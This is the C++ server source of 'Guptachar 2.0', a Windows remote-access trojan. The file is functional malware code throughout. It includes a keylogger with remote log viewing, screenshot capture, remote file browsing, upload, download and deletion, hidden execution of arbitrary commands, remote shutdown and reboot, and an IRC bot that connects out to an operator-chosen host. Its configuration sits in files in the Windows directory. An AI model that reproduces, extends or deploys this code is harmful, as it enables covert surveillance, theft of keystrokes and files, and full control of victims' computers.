/*
    Guptachar Server Class
    Copyright (C) 2002 Ayan Chakrabarti

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

    gserver.cpp
    ===========

    Implementation the guptachar server classes.
*/

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <winsock.h>
#include <stdio.h>
#include "glib\http.h"
#include "glib\utils.h"
#include "html\filemap.h"
#include "gserver.h"


/* Misc */

unsigned int getnum(char * s)
{
        unsigned int rval = 0;
        int i;

        for(i = 0;s[i];i++)
                rval = rval * 10 + s[i] - '0';
        return rval;
}

/* -- */

/* KeyLogging Prototypes & Functions*/

void log2html(SOCKET, char *);
void setkeylog(int);

void getlogname(char * name, char * fname)
{
        GetWindowsDirectory(fname,990);
        strcat(fname,"\\GPTCRKL\\");
        strcat(fname,name);
}

/* -- */

/* IRC BOT Prototypes */

void setircopts(char *, char *, unsigned int, char, char *, unsigned int);
void startbot(void);


/* -- */

/* Handle Various Options */

struct _options
{
        unsigned int guptport;  // Server Option

        char user[128];         // Authentication Options
        char pass[128];
        char auth[1024];
        char ifuseauth;

        unsigned int seq;      // KeyLogging Options
        char keylog;

        char ifirc;            // IRC Options
        char nick[1024];
        char host[1024];
        unsigned int port;
        char ifuseproxy;
        char proxy[1024];
        unsigned int pport;

} options;


/* The following function works vaguely, but works !! */
/* I wrote it once in a hurry, and I'm not writing it again !!! */

void conv_base64(char * input,char * output)
{
        int len,n,i,j = 0;
        char c1,c2,c3,o1,o2,o3,o4;
        char table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";


        len = strlen(input);
        n = len/3;

        for(i = 0;i < n;i++)
        {
             c1 = input[i*3];
             c2 = input[i*3+1];
             c3 = input[i*3+2];

             o1 = (c1 >> 2) & 0x3F;
             
             o2 = c1 & 0x03;
             o2 <<= 4;
             o2 &= 0xF0;
             c1 = c2 >> 4;
             c1 &= 0x0F;
             o2 += c1;

             o3 = c2 & 0x0F;
             o3 <<= 2;
             o3 &= 0xFC;
             c2 = c3 >> 6;
             c2 &= 0x03;
             o3 += c2;

             o4 = c3 & 0x3F;

             output[j++] = table[o1];
             output[j++] = table[o2];
             output[j++] = table[o3];
             output[j++] = table[o4];
        }

        if(len % 3 == 0)
        {
                output[j] = '\0';
                return;
        }

        if(len % 3 == 1)
        {
                c1 = input[len-1];
                c2 = 0;
        }

        if(len %3 == 2)
        {
                c1 = input[len-2];
                c2 = input[len-1];
        }

        c3 = 0;

        o1 = (c1 >> 2) & 0x3F;
             
        o2 = c1 & 0x03;
        o2 <<= 4;
        o2 &= 0xF0;
        c1 = c2 >> 4;
        c1 &= 0x0F;
        o2 += c1;
                         
        o3 = c2 & 0x0F;
        o3 <<= 2;
        o3 &= 0xFC;
        c2 = c3 >> 6;
        c2 &= 0x03;
        o3 += c2;

        o4 = c3 & 0x3F;

        output[j++] = table[o1];
        output[j++] = table[o2];
        output[j++] = table[o3];
        output[j++] = table[o4];

        output[j] = '\0';

        for(i = 0;i < (3 - len%3);i++)
                output[--j] = '=';
}

/* -- End of Vague Function */

void getoptname(char * fname)
{
        GetWindowsDirectory(fname,1000);
        if(fname[strlen(fname)-1] != '\\')
                strcat(fname,"\\");
        strcat(fname,"GPTCR.NFO");

}

void loadopts()
{
        FILE * fp;
        char fname[1024];

        getoptname(fname);
        fp = fopen(fname,"rt");
        if(!fp)
                return;
        fread((char *) &options, sizeof(options), 1, fp);
        fclose(fp);
}

void saveopts()
{
        FILE * fp;
        char fname[1024];

        getoptname(fname);
        fp = fopen(fname,"wt");
        if(!fp)
                return;
        fwrite((char *) &options, sizeof(options), 1, fp);
        fclose(fp);
}

int getkeyseq(void)
{
        int retval;

        retval = options.seq;
        options.seq++;
        saveopts();
        return retval;
}


void setkl(char k)
{
        options.keylog = k;
        saveopts();
        setkeylog(k);
}

void setauth(char ifuseauth, char * user, char * pass)
{
        char auth[257];

        if(strlen(user) > 127)
                user[127] = '\0';
        if(strlen(pass) > 127)
                pass[127] = '\0';

        options.ifuseauth = ifuseauth;
        strcpy(options.user,user);
        strcpy(options.pass,pass);

        strcpy(auth,user);
        strcat(auth,":");
        strcat(auth,pass);

        conv_base64(auth,options.auth);
        saveopts();
}

unsigned int initopts(void)
{
        options.guptport = 80;
        options.ifuseauth = 0;
        options.seq = 0;
        options.keylog = 0;
        options.user[0] = '\0';
        options.pass[0] = '\0';
        options.auth[0] = '\0';

        options.ifirc = 0;
        options.nick[0] = '\0';
        options.host[0] = '\0';
        options.proxy[0] = '\0';
        options.ifuseproxy = 0;
        options.port = 6667;
        options.pport = 3128;

        loadopts();
        setkeylog(options.keylog);
        if(options.ifirc)
        {
                setircopts(options.nick,options.host,options.port,options.ifuseproxy,
                           options.proxy,options.pport);

                startbot();
        }
        return options.guptport;
}



/* -- */

void sendheaders(SOCKET s)
{
        sendstring(s,"Server: Guptachar 2.0\r\n");
}

void send404(SOCKET s)
{
        const char * data;
        char type[1024];
        unsigned long sz;

        data = processURL("404",&sz,type);
        if(data == NULL)
        {
                closesocket(s);
                return;
        }

        sendstring(s,"HTTP/1.0 404 FILE NOT FOUND\r\n");
        sendheaders(s);
        sendstring(s,"Content-type: ");
        sendstring(s,type);
        sendstring(s,"\r\n\r\n");

        send(s,data,sz,0);

        closesocket(s);
}

void send401(SOCKET s)
{
        const char * data;
        char type[1024];
        unsigned long sz;

        data = processURL("401",&sz,type);
        if(data == NULL)
        {
                closesocket(s);
                return;
        }

        sendstring(s,"HTTP/1.0 401 No Authorization\r\nWWW-Authenticate: Basic realm=\"Guptachar 2.0\"\r\n");
        sendheaders(s);
        sendstring(s,"Content-type: ");
        sendstring(s,type);
        sendstring(s,"\r\n\r\n");

        send(s,data,sz,0);

        closesocket(s);
}


/* Handle Document Opens */

void getkey(HKEY h, char * path, char * str, int sz)
{
        unsigned long res;
        HKEY hkey;
        DWORD dwsz = sz,dwtype;

        res = RegOpenKeyEx(h,path,0,KEY_ALL_ACCESS,&hkey);

        str[0] = '\0';

        if(res != ERROR_SUCCESS)
               return;
        
        RegQueryValueEx(hkey,"",0,&dwtype, str, &dwsz);
        str[dwsz] = '\0';

        RegCloseKey(hkey);
}

void getext(char * ext, char * cmd, int sz)
{
        char fltype[1024];

        cmd[0] = '\0';
        getkey(HKEY_CLASSES_ROOT,ext,fltype,1023);
        strcat(fltype,"\\shell\\open\\command");
        getkey(HKEY_CLASSES_ROOT,fltype,cmd,sz);
}


int startit(char * fname)
{
        char * ext, stnm[1024], call[1024], * t;
        DWORD attrib;

        attrib = GetFileAttributes(fname);

        if(attrib & FILE_ATTRIBUTE_DIRECTORY)
        {
                strcpy(call,"explorer ");
                strcat(call,fname);
                WinExec(call,SW_RESTORE);
                return 1;
        }


        ext = strchr(fname,'.');
        if(ext == NULL)
                return 0;

        while(strchr(ext+1,'.') != NULL)
                ext = strchr(ext+1,'.');
        
        getext(ext,stnm,1023);

        if(stnm[0] == '\0')
                return 0;

        t = strstr(stnm,"%1");

        if(t == NULL)
        {

                strcpy(call,stnm);
                strcat(call," ");
                strcat(call,fname);
        }
        else
        {
                *t = '\0';

                strcpy(call,stnm);
                strcat(call,fname);
                t += 2;
                strcat(call,t);
        }

        WinExec(call,SW_RESTORE);
        return 1;
}


/* -- */

/* Handle Message Displays */

struct msgStruct
{
        char * msg;
        char threadLock;
};

long WINAPI threadMessageBox(LPVOID m)
{
        msgStruct * ms = (msgStruct *) m;
        char mymsg[1024];

        strcpy(mymsg,ms->msg);
        ms->threadLock = 0;

        MessageBox(0,mymsg,"Guptachar",0);
        return 0;
}

void DisplayMessage(char * str)
{
        msgStruct m;
        HANDLE h;

        m.msg = str;
        m.threadLock = 1;

        CreateThread(NULL,0,(LPTHREAD_START_ROUTINE) threadMessageBox,
                        (LPVOID) &m,0,(LPDWORD) &h);
        if(h)
        {
                CloseHandle(h);

                while(m.threadLock == 1)
                        continue;
        }
}

/* -- */


/* Parsing Functions Begin */

void findDollar(const char * data, unsigned long & pos, unsigned long sz)
{
        for(;pos < sz;pos++)
                if(data[pos] == '$')
                        break;
}

void parseIt(SOCKET s, const char * data, unsigned long & pos,
                        unsigned long sz, HTTPRequest & h)
{
        char name[1024];
        int i;

        for(i = 0, pos++; pos < sz && data[pos] != '$';pos++,i++)
                name[i] = data[pos];

        if(pos == sz)
                return;

        pos++;
        name[i] = '\0';

        if(name[0] == '\0')
        {
                send(s,"$",1,0);
        }
        else if(strcmp(name,"ISKL") == 0)
        {
                if(options.keylog)
                        sendstring(s,"checked");
        }
        else if(strcmp(name,"SHOWLOG") == 0)
        {
                char name[1024], fname[1024];

                h.getVars.searchList("FILE",name);
                getlogname(name,fname);
                log2html(s,fname);
        }
        else if(strcmp(name,"LOGFILE") == 0)
        {
                char action[1024],name[1024], fname[1024];

                h.postVars.searchList("ACTION",action);
                if(strcmp(action,"DELETE") == 0)
                {
                        h.postVars.searchList("FILE",name);
                        getlogname(name,fname);
                        DeleteFile(fname);
                        sendstring(s,"File Deleted");
                }
        }
        else if(strcmp(name,"KEYLOG") == 0)
        {
                char action[1024],ifkl[1024];

                h.postVars.searchList("ACTION",action);
                if(strcmp(action,"SETIT") == 0)
                {
                        h.postVars.searchList("IFKL",ifkl);
                        if(ifkl[0] == '\0')
                        {
                                setkl(0);
                                sendstring(s,"Keylogging Disabled");
                        }
                        else
                        {
                                setkl(1);
                                sendstring(s,"Keylogging Enabled");
                        }
                        
                }
        }
        else if(strcmp(name,"LOGLOOP") == 0)
        {
                char rep[1024];
                unsigned long ri;
                char search[1024],buf[1024];
                WIN32_FIND_DATA fd;
                HANDLE hfind;


                if(data[pos] != '{')
                        return;
                for(ri = 0, pos++;data[pos] != '}' && pos < sz;pos++,ri++)
                        rep[ri] = data[pos];

                if(pos == sz)
                        return;

                pos++;

                getlogname("*.KEY",search);
                hfind = FindFirstFile(search,&fd);

                while(hfind != INVALID_HANDLE_VALUE)
                {
                        unsigned long i,lpos;
                        i = lpos = 0;

                        while(i < ri)
                        {
                                findDollar(rep,i,ri);
                                send(s,&rep[lpos],i-lpos,0);

                                if(i < ri)
                                        sendstring(s,fd.cFileName);
                                i++;
                                lpos = i;
                        }

                        if(!FindNextFile(hfind,&fd))
                                break;
                }
                FindClose(hfind);
        }
        else if(strcmp(name,"HOSTNAME") == 0)
        {
                char comp[1024];
                DWORD dwdrv = 1023;

                if(!GetComputerName(comp,&dwdrv))
                        strcpy(comp,"Remote Machine");
                sendstring(s,comp);
        }
        else if(strcmp(name,"COPYDIR") == 0)
        {
                char buf[1024];

                h.postVars.searchList("DIR",buf);
                sendstring(s,buf);
        }
        else if(strcmp(name,"COPYFILE") == 0)
        {
                char buf[1024];

                h.postVars.searchList("FILE",buf);
                sendstring(s,buf);
        }
        else if(strcmp(name,"DISPLAYMSG") == 0)
        {
                char msg[1024];

                h.postVars.searchList("message",msg);
                if(msg[0] != '\0')
                {
                        DisplayMessage(msg);
                        sendstring(s,"Message Displayed");
                }
        }
        else if(strcmp(name,"SHUTDOWN") == 0)
        {
                char opt[1024];

                h.postVars.searchList("SW",opt);

                switch(opt[0])
                {
                        case '1':
                                sendstring(s,"System is going for Power Down");
                                ExitWindowsEx(EWX_SHUTDOWN,0);
                                break;

                        case '2':
                                sendstring(s,"System is going for Reboot");
                                ExitWindowsEx(EWX_REBOOT,0);
                                break;
                }
        }
        else if(strcmp(name,"EXECUTE") == 0)
        {
                char cmdline[1024],opt[1024];
                DWORD i;

                h.postVars.searchList("CMDLINE",cmdline);

                if(cmdline[0] != '\0')
                {
                        h.postVars.searchList("SW",opt);

                        switch(opt[0])
                        {
                                case '2': i = SW_MINIMIZE;
                                          break;
                                case '3': i = SW_MAXIMIZE;
                                          break;
                                case '4': i = SW_HIDE;
                                          break;
                                default:  i = SW_RESTORE;
                        }

                        WinExec(cmdline,i);
                        sendstring(s,"Command line issued");
                }
        }
        else if(strcmp(name,"UPLOAD") == 0)
        {
                if(h.filename[0] != '\0')
                {
                        FILE * fp = fopen(h.filename,"rb"), *fp2;
                        int pm1st,pm1sz,pm2st,pm2sz;
                        char path[1024],buf[4096];

                        if(fp)
                        {
                                h.fpostVars.searchList("PATH",&pm1st,&pm1sz);
                                h.fpostVars.searchList("LFILE",&pm2st,&pm2sz);

                                if(pm1st != -1 && pm2st != -1)
                                {
                                        fseek(fp,pm1st,SEEK_SET);
                                        fread(path,1,pm1sz,fp);

                                        fp2 = fopen(path,"wb");

                                        if(!fp2)
                                                sendstring(s,"Could not create destination file.");
                                        else
                                        {
                                                fseek(fp,pm2st,SEEK_SET);

                                                for(int i = 0;i < pm2sz/4096;i++)
                                                {
                                                        fread(buf,4096,1,fp);
                                                        fwrite(buf,4096,1,fp2);
                                                }

                                                if(pm2sz % 4096 != 0)
                                                {
                                                        fread(buf,pm2sz % 4096,1,fp);
                                                        fwrite(buf,pm2sz % 4096,1,fp2);
                                                }

                                                fclose(fp2);

                                                sendstring(s,"File Uploaded Successfully");
                                        }

                                }

                                fclose(fp);
                        }
                }
        }
        else if(strcmp(name,"BROWSEACTION") == 0)
        {
                char action[1024],file[1024];

                h.postVars.searchList("ACTION",action);
                h.postVars.searchList("FILE",file);

                if(strcmpi(action,"START") == 0)
                {
                        if(file[0] != '\0')
                        {
                                if(startit(file))
                                        sendstring(s,"File Opened on Remote Computer");
                                else
                                        sendstring(s,"Could not find association for file.");
                        }
                }
                else if(strcmpi(action,"MKDIR") == 0)
                {
                        if(file[0] != '\0')
                        {
                                if(CreateDirectory(file,NULL))
                                        sendstring(s,"Directory Created Successfully");
                                else
                                        sendstring(s,"Unable to create directory");

                        }
                }
                else if(strcmpi(action,"COPY") == 0)
                {
                        char source[1024],dest[1024];

                        h.postVars.searchList("SOURCE",source);
                        h.postVars.searchList("DEST",dest);

                        if(CopyFile(source,dest,FALSE))
                                sendstring(s,"File copied successfully.");
                        else
                                sendstring(s,"Could not copy file.");
                }
                else if(strcmpi(action,"DELETE") == 0)
                {
                        if(file[0] != '\0')
                        {
                                DWORD attr,newattr;
                                int result;

                                attr = GetFileAttributes(file);

                                if(attr & FILE_ATTRIBUTE_DIRECTORY)
                                        newattr = FILE_ATTRIBUTE_DIRECTORY;
                                else
                                        newattr = FILE_ATTRIBUTE_ARCHIVE;

                                SetFileAttributes(file,newattr);

                                if(attr & FILE_ATTRIBUTE_DIRECTORY)
                                        result = RemoveDirectory(file);
                                else
                                        result = DeleteFile(file);

                                if(result)
                                        sendstring(s,"File Successfully Deleted");
                                else
                                        sendstring(s,"Unable to Delete File.");
                        }
                }
        }
        else if(strcmp(name,"GUPTPORT") == 0)
        {
                char outb[1024];

                sprintf(outb,"%d",options.guptport);
                sendstring(s,outb);
        }
        else if(strcmp(name,"IFIRC") == 0)
        {
                if(options.ifirc)
                        sendstring(s,"checked");
        }
        else if(strcmp(name,"IFUSEPROXY") == 0)
        {
                if(options.ifuseproxy)
                        sendstring(s,"checked");
        }
        else if(strcmp(name,"IRCNICK") == 0)
                sendstring(s,options.nick);
        else if(strcmp(name,"IRCHOST") == 0)
                sendstring(s,options.host);
        else if(strcmp(name,"IRCPROXY") == 0)
                sendstring(s,options.proxy);
        else if(strcmp(name,"IRCPORT") == 0)
        {
                char outb[1024];
                sprintf(outb,"%d",options.port);
                sendstring(s,outb);
        }
        else if(strcmp(name,"IRCPPORT") == 0)
        {
                char outb[1024];
                sprintf(outb,"%d",options.pport);
                sendstring(s,outb);
        }
        else if(strcmp(name,"BROWSEDIR") == 0)
        {
                char comp[1024];
                DWORD dwdrv = 1023;

                h.postVars.searchList("dir",comp);
                if(comp[0] == '\0')
                        if(!GetComputerName(comp,&dwdrv))
                                strcpy(comp,"Remote Machine");
                sendstring(s,comp);
        }
        else if(strcmp(name,"SETOPTS") == 0)
        {
                char action[1024];

                h.postVars.searchList("ACTION",action);

                if(strcmp(action,"PASSWD") == 0)
                {
                        char ifuseauth, user[1024], pass[1024];

                        h.postVars.searchList("USEPASS",user);
                        if(strcmpi(user,"ON") == 0)
                                ifuseauth = 1;
                        else
                                ifuseauth = 0;
                        h.postVars.searchList("USERNAME",user);
                        h.postVars.searchList("PASSWORD",pass);
                        setauth(ifuseauth,user,pass);
                        sendstring(s,"Authentication Updated");
                }
                else if(strcmp(action,"SETPORT") == 0)
                {
                        char port[1024];

                        h.postVars.searchList("PORT",port);
                        options.guptport = getnum(port);
                        saveopts();
                        sendstring(s,"Server Port Updated");
                }
                else if(strcmp(action,"IRCBOT") == 0)
                {
                        char buf[1024];

                        h.postVars.searchList("IFIRC",buf);
                        if(buf[0] != '\0')
                                options.ifirc = 1;
                        else
                                options.ifirc = 0;

                        h.postVars.searchList("IFUSEPROXY",buf);
                        if(buf[0] != '\0')
                                options.ifuseproxy = 1;
                        else
                                options.ifuseproxy = 0;


                        h.postVars.searchList("NICK",buf);
                        strcpy(options.nick,buf);

                        h.postVars.searchList("HOST",buf);
                        strcpy(options.host,buf);

                        h.postVars.searchList("PORT",buf);
                        options.port = getnum(buf);

                        h.postVars.searchList("PROXY",buf);
                        strcpy(options.proxy,buf);

                        h.postVars.searchList("PPORT",buf);
                        options.pport = getnum(buf);

                        saveopts();

                        sendstring(s,"IRC BOT Options Updated");
                             
                }

        }
        else if(strcmp(name,"IFUSEPASS") == 0)
        {
                if(options.ifuseauth)
                        sendstring(s,"checked");
        }
        else if(strcmp(name,"CURUSER") == 0)
                sendstring(s,options.user);
        else if(strcmp(name,"CURPASS") == 0)
                sendstring(s,options.pass);
        else if(strcmp(name,"BROWSELOOP") == 0)
        {
                
                char rep[1024],dirname[1024],vol[1024];
                unsigned long ri;

                if(data[pos] != '{')
                        return;
                for(ri = 0, pos++;data[pos] != '}' && pos < sz;pos++,ri++)
                        rep[ri] = data[pos];

                if(pos == sz)
                        return;

                pos++;

                h.postVars.searchList("dir",dirname);

                if(dirname[0] == '\0')  // Give Listing of Logical Drives
                {
                        char * drv;

                        GetLogicalDriveStrings(1023,dirname);
                        drv = dirname;

                        while(*drv != '\0')
                        {
                                unsigned long i,cnt,lpos;

                                i = cnt = lpos = 0;

                                vol[0] = '\0';

                                if(drv[0] != 'a' && drv[0] != 'A' && drv[0] != 'b' && drv[0] != 'B') 
                                        GetVolumeInformation(drv,vol,1023,NULL,NULL,NULL,NULL,0);
                                while(i < ri)
                                {
                                        findDollar(rep,i,ri);
                                        send(s,&rep[lpos],i-lpos,0);

                                        if(i < ri)
                                        {
                                                switch(cnt)
                                                {

                                                        case 0:
                                                                sendstring(s,drv);
                                                                break;
                                                        case 1:
                                                                if(vol[0] != '\0')
                                                                {
                                                                        sendstring(s,"[");
                                                                        sendstring(s,vol);
                                                                        sendstring(s,"]");
                                                                }
                                                                break;
                                                        case 2:
                                                                sendstring(s,"/browse.html");
                                                                break;
                                                        case 3:
                                                                sendstring(s,drv);
                                                                break;
                                                        case 4:
                                                                sendstring(s,"Browse");
                                                                break;
                                                        case 5:
                                                                sendstring(s,"");
                                                                break;
                                                        case 6:
                                                                sendstring(s,"");
                                                                break;
                                                        case 7:
                                                                sendstring(s,"HIDDEN");
                                                                break;
                                                        case 8:
                                                                sendstring(s,"");
                                                                break;
                                                        case 9:
                                                                sendstring(s,"");
                                                                break;
                                                        case 10:
                                                                sendstring(s,"HIDDEN");
                                                                break;
                                                        case 11:
                                                                sendstring(s,"");
                                                                break;
                                                        case 12:
                                                                sendstring(s,"");
                                                                break;
                                                        case 13:
                                                                sendstring(s,"HIDDEN");
                                                                break;


                                                }

                                                cnt++;
                                        }
                                        i++;
                                        lpos = i;
                                }



                                drv = drv + sizeof(char) * (strlen(drv) + 1);
                        }
                }
                else            // Get Listing of files in directory
                {
                        char search[1024],buf[1024];
                        WIN32_FIND_DATA fd;
                        HANDLE hfind;

                        if(dirname[strlen(dirname)-1] != '\\')
                                strcat(dirname,"\\");

                        strcpy(search,dirname);
                        strcat(search,"*.*");

                        hfind = FindFirstFile(search,&fd);

                        while(hfind != INVALID_HANDLE_VALUE)
                        {
                                unsigned long i,cnt,lpos;

                                i = cnt = lpos = 0;

                                while(i < ri)
                                {
                                        findDollar(rep,i,ri);
                                        send(s,&rep[lpos],i-lpos,0);

                                        if(i < ri)
                                        {
                                                switch(cnt)
                                                {

                                                        case 0:
                                                                if(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                                                                        sprintf(buf,"[%s]",fd.cFileName);
                                                                else
                                                                        sprintf(buf,"%s",fd.cFileName);

                                                                sendstring(s,buf);
                                                                break;
                                                        case 1:
                                                                if(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                                                                {
                                                                        sendstring(s,"DIR");
                                                                }
                                                                else
                                                                {
                                                                        sprintf(buf,"%ld",fd.nFileSizeLow);
                                                                        sendstring(s,buf);
                                                                }
                                                                break;
                                                        case 2:
                                                                if(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                                                                        sendstring(s,"/browse.html");
                                                                else
                                                                        sendstring(s,"/download");
                                                                break;

                                                        case 3:
                                                                sprintf(buf,"%s%s",dirname,fd.cFileName);
                                                                sendstring(s,buf);
                                                                break;
                                                        case 4:
                                                                if(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                                                                        sendstring(s,"&nbsp;&nbsp;Browse&nbsp;&nbsp;&nbsp;");
                                                                else
                                                                        sendstring(s,"Download");
                                                                break;
                                                        case 5:
                                                                sendstring(s,dirname);
                                                                break;
                                                        case 6:
                                                                sendstring(s,dirname);
                                                                sendstring(s,fd.cFileName);
                                                                break;
                                                        case 7:
                                                                sendstring(s,"SUBMIT");
                                                                break;
                                                        case 8:
                                                                sendstring(s,dirname);
                                                                break;
                                                        case 9:
                                                                sendstring(s,dirname);
                                                                sendstring(s,fd.cFileName);
                                                                break;
                                                        case 10:
                                                                sendstring(s,"SUBMIT");
                                                                break;
                                                        case 11:
                                                                sendstring(s,dirname);
                                                                break;
                                                        case 12:
                                                                sendstring(s,dirname);
                                                                sendstring(s,fd.cFileName);
                                                                break;
                                                        case 13:
                                                                sendstring(s,"SUBMIT");
                                                                break;
                                                }
                                                cnt++;
                                        }
                                        i++;
                                        lpos = i;
                                }

                                if(!FindNextFile(hfind,&fd))
                                        break;
                        }
                        FindClose(hfind);

                }
        }

}


void sendParsed(SOCKET s, const char * data, unsigned long sz,HTTPRequest & h)
{
        unsigned long pos, lpos;

        pos = lpos = 0;

        while(pos < sz)
        {
                findDollar(data,pos,sz);
                send(s,&data[lpos],pos-lpos,0);

                if(pos < sz)
                        parseIt(s,data,pos,sz,h);
                lpos = pos;
        }
}


/* Parsing Functions End */

void dumpscreen(char *);

void GuptServer::showPage(HTTPRequest & h, SOCKET s)
{
        const char * data;
        char type[1024], buf[1024];
        unsigned long sz;

        if(options.ifuseauth)
        {
                char auth[1024];
                int i;

                h.headers.searchList("Authorization",auth);
                for(i = 0; auth[i] != ' ' && auth[i] != '\0';i++);
                for(;auth[i] == ' ' && auth[i] != '\0';i++);

                if(strcmp(&auth[i],options.auth) != 0)
                {
                        send401(s);
                        return;
                }
        }

        data = processURL(h.url,&sz,type);

        if(data != NULL)
        {
                sendstring(s,"HTTP/1.0 200 OK\r\n");
                sendheaders(s);
                sendstring(s,"Content-type: ");
                sendstring(s,type);
                sendstring(s,"\r\n\r\n");

                if(strstr(type,"text") == NULL)
                        send(s,data,sz,0);
                else
                        sendParsed(s,data,sz,h);

                closesocket(s);
                return;
        }
        else if(strcmpi(h.url,"/shot") == 0)
        {
                char fname[10];

                strcpy(fname,"1GPTCHR~");
                srand(time(NULL));
                fname[0] = 'a' + rand() % 26;

                dumpscreen(fname);

                FILE * fp;
                unsigned long fsz,i;
                char buf[4097];

                fp = fopen(fname,"rb");
                if(fp)
                {
                        fseek(fp,0,SEEK_END);
                        fsz = ftell(fp);
                        fseek(fp,0,SEEK_SET);
                                
                        sendstring(s,"HTTP/1.0 200 OK\r\n");
                        sendheaders(s);
                        sendstring(s,"Content-type: image/bmp\r\n");
                        sprintf(buf,"Content-Length: %ld",fsz);
                        sendstring(s,buf);
                        sendstring(s,"\r\nConnection: close\r\n\r\n");

                        for(i = 0;i < fsz/4096;i++)
                        {
                                fread(buf,4096,1,fp);
                                send(s,buf,4096,0);
                        }

                        if(fsz%4096 != 0)
                        {
                                fread(buf,fsz%4096,1,fp);
                                send(s,buf,fsz%4096,0);
                        }

                        fclose(fp);
                        closesocket(s);
                        DeleteFile(fname);
                        return;
                }

        }
        else if(strcmpi(h.url,"/download") == 0)
        {
                char fname[1024];
                h.postVars.searchList("dir",fname);

                if(fname[0] != '\0')
                {
                        FILE * fp;
                        unsigned long fsz,i;
                        char buf[4097];

                        fp = fopen(fname,"rb");
                        if(fp)
                        {
                                fseek(fp,0,SEEK_END);
                                fsz = ftell(fp);
                                fseek(fp,0,SEEK_SET);
                                
                                sendstring(s,"HTTP/1.0 200 OK\r\n");
                                sendheaders(s);
                                sendstring(s,"Content-type: application/octet-stream\r\n");
                                sprintf(buf,"Content-Length: %ld",fsz);
                                sendstring(s,buf);
                                sendstring(s,"\r\nConnection: close\r\n\r\n");

                                for(i = 0;i < fsz/4096;i++)
                                {
                                        fread(buf,4096,1,fp);
                                        send(s,buf,4096,0);
                                }
                                if(fsz%4096 != 0)
                                {
                                        fread(buf,fsz%4096,1,fp);
                                        send(s,buf,fsz%4096,0);
                                }

                                fclose(fp);
                                closesocket(s);
                                return;
                        }
                }
        }
        else if(strcmp(h.url,"/die") == 0)
                ExitProcess(0);

        send404(s);
        return;

}
